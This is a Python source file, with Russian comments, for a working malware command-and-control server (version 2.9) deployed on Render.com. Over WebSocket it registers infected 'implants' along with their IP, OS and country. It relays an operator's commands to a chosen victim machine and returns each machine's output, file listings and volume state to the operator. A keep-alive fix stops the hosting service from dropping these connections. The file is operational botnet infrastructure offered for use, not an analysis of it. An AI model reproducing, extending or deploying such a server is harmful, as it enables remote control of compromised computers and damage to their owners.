#
# --- Файл: c2_server.py (Версия 2.9 - "Сердечный Ритм") ---
# Это финальная версия. Она решает проблему обрыва соединения
# на хостинге Render.com, включая автоматический keep-alive.
#
import asyncio
import json
import os
from aiohttp import web

# ==============================================================================
# ГЛОБАЛЬНОЕ СОСТОЯНИЕ
# ==============================================================================
IMPLANTS, OPERATOR = {}, {}

# ==============================================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ==============================================================================
async def send_to_operator(payload):
  if OPERATOR and not OPERATOR.get("ws").closed:
    try:
      await OPERATOR["ws"].send_json(payload)
    except Exception:
      pass

async def broadcast_bot_list():
  bot_info_list = []
  for bot_id, bot_data in IMPLANTS.items():
    initial_data = bot_data.get("initial_data", {})
    bot_info_list.append({
      "id": bot_id,
      "os": initial_data.get("os_info", "N/A"),
      "ip": bot_data.get("ip", "N/A"),
      "country": bot_data.get("country", "N/A")
    })
  await send_to_operator({'type': 'bot_list', 'data': bot_info_list})

# ==============================================================================
# ОСНОВНОЙ ОБРАБОТЧИК WEBSOCKET
# ==============================================================================
async def websocket_handler(request):
  global OPERATOR, IMPLANTS
  ws = web.WebSocketResponse()

  # <<< ВОТ ОН. СЕРДЕЧНЫЙ РИТМ. >>>
  # Этот параметр заставляет aiohttp самостоятельно обрабатывать
  # низкоуровневые пинги, что не дает Render.com убить соединение.
  await ws.prepare(request, heartbeat=25.0)

  client_type, client_id = None, None
  client_ip = request.remote

  try:
    async for msg in ws:
      if msg.type != web.WSMsgType.TEXT:
        continue
      if msg.data == 'ping':
        await ws.send_str('pong') # На всякий случай, если наша панель пингует
        continue

      try:
        data = json.loads(msg.data)
      except json.JSONDecodeError:
        continue

      if client_type is None:
        msg_type = data.get('type')
        if msg_type == 'operator':
          client_type = 'operator'
          OPERATOR = {"ws": ws}
          print(f"[+] Оператор подключился с IP: {client_ip}")
          await broadcast_bot_list()
        elif msg_type == 'implant':
          client_type = 'implant'
          client_id = data.get('id')
          IMPLANTS[client_id] = {"ws": ws, "initial_data": data, "ip": client_ip}
          print(f"[+] Новый имплант онлайн: {client_id} с IP: {client_ip}")
          await broadcast_bot_list()
        else:
          break
        continue

      if client_type == 'operator':
        target_id = data.get('target_id')
        payload = data.get('payload')
        command_type = data.get('type')

        if command_type == 'get_details' and target_id in IMPLANTS:
          initial_data = IMPLANTS[target_id].get("initial_data", {})
          details = { "files": initial_data.get("files"), "volume_state": initial_data.get("volume_state") }
          await send_to_operator({'type': 'bot_details', 'bot_id': target_id, 'data': details})
        elif command_type == 'command' and target_id in IMPLANTS:
          await IMPLANTS[target_id]["ws"].send_json(payload)

      elif client_type == 'implant':
        data['bot_id'] = client_id
        await send_to_operator(data)

  except Exception as e:
    print(f"[!] Ошибка в сессии с '{client_id or client_ip}': {e}")
  finally:
    if client_type == 'implant' and client_id in IMPLANTS:
      del IMPLANTS[client_id]
      print(f"[-] Имплант отключился: {client_id}")
      await broadcast_bot_list()
    elif client_type == 'operator':
      OPERATOR = {}
      print(f"[-] Оператор отключился: {client_ip}")

  return ws

# ==============================================================================
# ЗАПУСК
# ==============================================================================
async def http_handler(request):
  return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

app = web.Application()
app.router.add_get('/', http_handler)
app.router.add_get('/ws', websocket_handler)

if __name__ == "__main__":
  port = int(os.environ.get("PORT", 10000))
  print(f"====== C2 SERVER (V2.9) ONLINE on port {port} ======")
  web.run_app(app, host='0.0.0.0', port=port)
